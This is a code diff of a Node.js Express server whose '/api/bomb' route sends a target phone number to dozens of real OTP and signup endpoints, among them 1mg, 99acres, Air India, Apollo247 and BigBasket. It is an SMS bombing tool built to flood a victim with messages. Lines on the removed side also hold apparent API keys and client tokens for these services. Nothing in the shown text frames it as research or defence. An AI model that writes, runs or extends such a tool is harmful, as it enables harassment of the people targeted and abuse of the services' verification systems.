@@ -2,7 +2,6 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const path = require('path');
 const axios = require('axios');
-const FormData = require('form-data');
 const fs = require('fs');
 
 const app = express();
@@ -163,21 +162,20 @@ app.post('/api/bomb', requireAuth, async (req, res) => {
   const with91 = '91' + plain10;
   const endpoints = [];
 
-  // FULL ORIGINAL ENDPOINTS
-  endpoints.push({ name: 'apna_co_v1', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' }, body: { phone_number: with91, retries: 0, hash_type: 'employer', source: 'employer' } });
+  // Re-adding all original endpoints
+  endpoints.push({ name: 'apna_co_v1', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone_number: with91, retries: 0, hash_type: 'employer', source: 'employer' } });
   endpoints.push({ name: '1mg_create_token', url: 'https://www.1mg.com/pwa-dweb-api/auth/create_token', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key' }, body: { number: plain10 } });
   endpoints.push({ name: '1mg_push_lead', url: 'https://www.1mg.com/pwa-dweb-api/api/labs/v1/lead/push_lead', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key' }, body: { mobile_number: plain10, source: 'DWEB_PHARMA_HOME' } });
-  endpoints.push({ name: '99acres', url: 'https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true', method: 'POST', headers: { 'Content-Type': 'application/json', 'Deviceid': 'ff30edc83660f68292c903b4eb765e43' }, body: { mobile: `91-${plain10}`, countryCode: '91', mode: 'LOGIN_GENERATE', platform: 'desktop', source: 'homePage_Desktop', sellerPage: false, seamless: true } });
-  endpoints.push({ name: 'aakash', url: 'https://antheapi.aakash.ac.in/api/generate-lead-otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Client-Id': 'a6fbf1d2-27c3-46e1-b149-0380e506b763' }, body: { mobile_psid: plain10, mobile_number: plain10, activity_type: 'aakash-myadmission-signup' } });
-  endpoints.push({ name: 'acko', url: 'https://www.acko.com/external/api/v2/send', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Write-Key': 'AvQ5tZYUHTm9TexmMxY9dBoJ9uAT1KHo' }, body: { event_type: 'track', event_name: 'tap_send_otp_cta', event_properties: { phone: plain10, platform: 'web', product: 'universal' } } });
-  endpoints.push({ name: 'airindia', url: 'https://api.airindia.com/ai-users/v1/auth/signup/init', method: 'POST', headers: { 'Content-Type': 'application/json', 'Ocp-Apim-Subscription-Key': '8ea658f3ac1e44cca129d7ed252d4c42', 'X-Request-Source': 'website' }, body: { phone: { countryCode: '91', number: plain10, _combinedNumber: `91${plain10}` }, preferences: true } });
-  endpoints.push({ name: 'airtel_tv', url: 'https://api.airtel.tv/v2/user/profile/generateOtp?appId=WEB', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { msisdn: plain10, msgTxt: 'Use {OTP} as your login OTP.' } });
-  endpoints.push({ name: 'apollo247', url: 'https://apigateway.apollo247.in/auth-service/generateOtp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-App-Os': 'web' }, body: { loginType: 'PATIENT', mobileNumber: `+${with91}` } });
+  endpoints.push({ name: '99acres', url: 'https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobile: `91-${plain10}`, countryCode: '91', mode: 'LOGIN_GENERATE', platform: 'desktop' } });
+  endpoints.push({ name: 'aakash', url: 'https://antheapi.aakash.ac.in/api/generate-lead-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobile_number: plain10, activity_type: 'aakash-myadmission-signup' } });
+  endpoints.push({ name: 'acko', url: 'https://www.acko.com/external/api/v2/send', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { event_type: 'track', event_name: 'tap_send_otp_cta', event_properties: { phone: plain10 } } });
+  endpoints.push({ name: 'airindia', url: 'https://api.airindia.com/ai-users/v1/auth/signup/init', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: { countryCode: '91', number: plain10 } } });
+  endpoints.push({ name: 'airtel_tv', url: 'https://api.airtel.tv/v2/user/profile/generateOtp?appId=WEB', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { msisdn: plain10 } });
+  endpoints.push({ name: 'apollo247', url: 'https://apigateway.apollo247.in/auth-service/generateOtp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { loginType: 'PATIENT', mobileNumber: `+${with91}` } });
   endpoints.push({ name: 'bankbazaar', url: 'https://bankbazaar.com/auth/trigger-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobileNumber: plain10 } });
-  endpoints.push({ name: 'bewakoof', url: 'https://api-prod.bewakoof.com/v3/user/auth/login/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'Api-Token': 'MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm' }, body: { mobile: plain10, country_code: '+91' } });
-  endpoints.push({ name: 'bharatmatrimony', url: 'https://greg.bharatmatrimony.com/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { query: `mutation RegisterBasicWebInfo($input: RegistrationBasicWebInput!) { registerBasicWebInfo(input: $input) { registerId status } }`, variables: { input: { mobileNumber: plain10, name: 'USER', source: '00500000031' } } } });
-  endpoints.push({ name: 'bigbasket', url: 'https://www.bigbasket.com/member-tdl/v3/member/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Channel': 'BB-WEB' }, body: { identifier: plain10, referrer: 'unified_login' } });
-  endpoints.push({ name: 'boat_lifestyle', url: 'https://www.boat-lifestyle.com/account/login', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, bodyForm: `customer[email]=${plain10}@gmail.com&customer[password]=password123` });
+  endpoints.push({ name: 'bewakoof', url: 'https://api-prod.bewakoof.com/v3/user/auth/login/otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobile: plain10, country_code: '+91' } });
+  endpoints.push({ name: 'bharatmatrimony', url: 'https://greg.bharatmatrimony.com/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { query: `mutation { registerBasicWebInfo(input: { mobileNumber: "${plain10}" }) { status } }` } });
+  endpoints.push({ name: 'bigbasket', url: 'https://www.bigbasket.com/member-tdl/v3/member/otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { identifier: plain10 } });
   endpoints.push({ name: 'byjus', url: 'https://byjus.com/byjus-web/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10, countryCode: '91' } });
   endpoints.push({ name: 'cardekho', url: 'https://www.cardekho.com/api/v1/user/login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobile: plain10 } });
   endpoints.push({ name: 'cars24', url: 'https://www.cars24.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
@@ -234,18 +232,11 @@ app.post('/api/bomb', requireAuth, async (req, res) => {
         headers: ep.headers || { 'Content-Type': 'application/json' },
         timeout: 10000
       };
-      if (ep.method === 'POST') {
-        if (ep.bodyForm) {
-          config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-          config.data = ep.bodyForm;
-        } else {
-          config.data = ep.body;
-        }
-      }
+      if (ep.method === 'POST') config.data = ep.body;
       const response = await axios(config);
       return { name: ep.name, success: true };
     } catch (err) {
-      return { name: ep.name, success: false, status: err.response?.status };
+      return { name: ep.name, success: false };
     }
   });
 
